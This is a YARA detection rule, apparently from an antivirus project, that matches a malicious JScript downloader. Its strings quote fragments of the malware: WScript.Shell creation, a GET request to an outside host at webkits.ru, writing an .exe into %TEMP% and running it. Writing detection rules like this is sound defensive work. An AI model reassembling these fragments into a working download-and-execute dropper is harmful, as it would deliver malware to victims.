rule sig_20160330_e17caa1bd8d7fd946fb8ca619afa04bf {
  meta:
    description = "datamaliciousorder - file 20160330_e17caa1bd8d7fd946fb8ca619afa04bf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7c7dfb4c6f62ce16cc8f49b62b8908de75cf1a58b11f0b97e423616c3dbecc13"

  strings:
    $s1  = "var UQ = function C() {return WScript[T](\"WScript\"+\".Shell\");}(), CJ = 11;" fullword ascii
    $s2  = "function AD(N2, Z){C0 = C0 * 1; return N2 - Z;};" fullword ascii
    $s3  = "X0[SK](\"GET\", \"http://webkits.ru/mn3dka\", false);" fullword ascii
    $s4  = "if (X0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OM() {return UQ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"VmT5aN0iAgMkHj.ex\" + \"e\";};" fullword ascii
    $s6  = "function DJ(){return H + \"\";};" fullword ascii
    $s7  = "function E() {return ((KR == true) && (KR == L)) ? 1 : C0;};" fullword ascii
    $s8  = "function J(MM){UQ[\"Run\"](MM, C0, C0);};" fullword ascii
    $s9  = "var U = new this[\"Date\"]();" fullword ascii
    $s10 = "return AD(N0, N);" fullword ascii
    $s11 = "}while (UO);" fullword ascii
    $s12 = "function VV(TA) {var XY = (1, 2, 3, 4, 5, TA); return XY;};" fullword ascii
    $s13 = "function MJ()" fullword ascii
    $s14 = "function EF(){return 22;};" fullword ascii
    $s15 = "function Q(){return T;};" fullword ascii
    $s16 = "var L = false;" fullword ascii
    $s17 = "L = true; " fullword ascii
    $s18 = "var KR = false;" fullword ascii
    $s19 = "KR = true; " fullword ascii
    $s20 = "} catch(D){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}